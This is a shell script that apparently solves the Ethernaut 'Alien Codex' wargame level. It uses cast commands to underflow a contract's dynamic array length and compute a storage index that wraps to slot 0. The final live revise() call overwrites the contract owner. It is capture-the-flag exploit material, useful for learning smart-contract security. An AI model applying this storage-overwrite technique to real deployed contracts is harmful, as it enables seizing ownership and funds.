source ~/ethernauts/.env
echo "RPC_URL: $RPC_URL"

INSTANCE=0x971b62B52F70209A9203963f493930c8A2Bf0c62
BYTES32_ADDRESS=$(printf "%064s" "${PRIMARY_ADDRESS:2}" | tr ' ' 0)

# cast call \
#   --rpc-url $RPC_URL \
#   $INSTANCE \
#   "contact()(bool)"
# # returns false

# cast storage $INSTANCE --rpc-url $RPC_URL 0
# # returns 0x000000000000000000000000f2531ff8b7ec8886ce5b48b05ab7894d25ff4bf8
# cast storage $INSTANCE --rpc-url $RPC_URL 1
# # returns 0x0000000000000000000000000000000000000000000000000000000000000000

# cast send \
#   --rpc-url $RPC_URL \
#   --private-key $PRIVATE_KEY \
#   $INSTANCE \
#   "makeContact()"

# cast call \
#   --rpc-url $RPC_URL \
#   $INSTANCE \
#   "contact()(bool)"
# # returns true

# cast storage $INSTANCE --rpc-url $RPC_URL 0
# # returns 0x000000000000000000000001f2531ff8b7ec8886ce5b48b05ab7894d25ff4bf8
# cast storage $INSTANCE --rpc-url $RPC_URL 1
# # returns 0x0000000000000000000000000000000000000000000000000000000000000000

# retract codex[] length to underflow, size : 0 -> max(uint256)
# cast send \
#   --rpc-url $RPC_URL \
#   --private-key $PRIVATE_KEY \
#   $INSTANCE \
#   "retract()"

# cast storage $INSTANCE --rpc-url $RPC_URL 1
# # returns 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff


# now write in a specific slot the value we want.
# we want out address $PRIMARY_ADDRESS in the first slot of the contract
# memory slot accessed by an array is:
# keccak(storage_slot_of_array_size) in this case it is contract slot 1
# keccak256(0x0000000000000000000000000000000000000000000000000000000000000001)
# then codex[0] is written in keccak256(0x00..01) + 0
# then codex[1] is written in keccak256(0x00..01) + 1
# etc
# therefore, to overwrite the owner of this contract, in slot 0
# i want an X that satisfies
# keccak256(0x00..01) + x = 0 (overflow)
# max(uint256) - keccak256(0x00..01) + 1 = X
# 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 1 = X
# 4EF1D2AD89EDF8C4D91132028E8195CDF30BB4B5053D4F8CD260341D4805F309 + 1 = 4EF1D2AD89EDF8C4D91132028E8195CDF30BB4B5053D4F8CD260341D4805F30A = x
# = 35707666377435648211887908874984608119992236509074197713628505308453184860938
# which should be the index of the owner variable

# cast call \
#   --rpc-url $RPC_URL \
#   $INSTANCE \
#   "codex(uint256)(bytes32)" 35707666377435648211887908874984608119992236509074197713628505308453184860938
# returns slot0

cast send \
  --rpc-url $RPC_URL \
  --private-key $PRIVATE_KEY \
  $INSTANCE \
  "revise(uint256, bytes32)()" 35707666377435648211887908874984608119992236509074197713628505308453184860938 $BYTES32_ADDRESS

echo owner:
cast call \
  --rpc-url $RPC_URL \
  $INSTANCE \
  "owner()(address)"
